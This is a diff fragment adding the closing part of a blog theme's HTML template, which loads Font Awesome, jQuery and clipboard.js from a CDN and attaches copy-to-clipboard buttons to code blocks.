+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
